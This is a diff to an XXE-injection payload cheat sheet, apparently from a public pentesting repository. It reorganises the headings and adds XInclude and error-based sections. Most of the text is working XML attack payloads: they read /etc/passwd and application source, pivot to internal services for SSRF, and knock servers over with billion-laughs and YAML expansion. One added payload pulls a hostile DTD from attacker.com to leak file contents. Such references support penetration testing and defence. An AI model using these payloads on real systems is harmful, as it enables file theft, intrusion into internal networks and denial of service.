@@ -12,11 +12,16 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 - [Tools](#tools)
 - [Detect the vulnerability](#detect-the-vulnerability)
-- [Read file content](#read-file-content)
-- [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
-- [XXE to SSRF](#xxe-to-ssrf)
-- [Deny of service](#deny-of-service)
-- [Blind XXE - Out of Band](#blind-xxe---out-of-Band)
+- [Exploiting XXE to retrieve files](#exploiting-xxe-to-retrieve-files)
+  - [Classic XXE](#classic-xxe)
+  - [Classic XXE Base64 encoded](#classic-xxe-base64-encoded)
+  - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
+  - [XInclude attacks](#xinclude-attacks)
+- [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
+- [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
+  - [Billion Laugh Attack](#billion-laugh-attack)
+- [Error Based XXE](#error-based-xxe)
+- [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
   - [Blind XXE](#blind-xxe)
   - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
   - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
@@ -53,9 +58,11 @@ Basic entity test, when the XML parser parses the external entities the result s
 
 It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.
 
-## Read file content
+## Exploiting XXE to retrieve files
 
-Classic XXE, we try to display the content of the file `/etc/passwd` 
+### Classic XXE
+
+We try to display the content of the file `/etc/passwd` 
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -93,14 +100,13 @@ Classic XXE, we try to display the content of the file `/etc/passwd`
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
 
-
-Classic XXE Base64 encoded
+### Classic XXE Base64 encoded
 
 ```xml
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 ```
 
-## PHP Wrapper inside XXE
+### PHP Wrapper inside XXE
 
 ```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
@@ -124,7 +130,16 @@ Classic XXE Base64 encoded
 <foo>&xxe;</foo>
 ```
 
-## XXE to SSRF
+### XInclude attacks
+
+When you can't modify the **DOCTYPE** element use the **XInclude** to target 
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+## Exploiting XXE to perform SSRF attacks
 
 XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.
 
@@ -132,17 +147,17 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "http://secret.dev.company.com/secret_pass.txt" >
+<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
 ]>
 <foo>&xxe;</foo>
 ```
 
 
-## Deny of service
+## Exploiting XXE to perform a deny of service
 
 :warning: : These attacks might kill the service or the server, do not use them on the production.
 
-Billion Laugh Attack
+### Billion Laugh Attack
 
 ```xml
 <!DOCTYPE data [
@@ -155,7 +170,7 @@ Billion Laugh Attack
 <data>&a4;</data>
 ```
 
-Yaml attack
+### Yaml attack
 
 ```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
@@ -169,7 +184,30 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
-## Blind XXE - Out of Band
+
+## Error Based XXE
+
+**Payload to trigger the XXE**
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+    %ext;
+]>
+<message></message>
+```
+
+**Contents of ext.dtd**
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+
+## Exploiting blind XXE to exfiltrate data out-of-band
 
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
 
@@ -301,7 +339,7 @@ GIF (experimental)
 * [Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
 * [staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
-* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
+* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
 * [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)](http://en.hackdig.com/08/28075.htm)
 * [Understanding Xxe From Basic To Blind - 10/11/2018 - Utkarsh Agrawal](http://agrawalsmart7.com/2018/11/10/Understanding-XXE-from-Basic-to-Blind.html)
 * [From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
@@ -312,3 +350,5 @@ GIF (experimental)
 * [XXE by SVG in community.lithium.com](http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/)
 * [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 * [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
+* [Exploiting XXE with local DTD files - Arseniy Sharoglazov - 12/12/2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+* [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
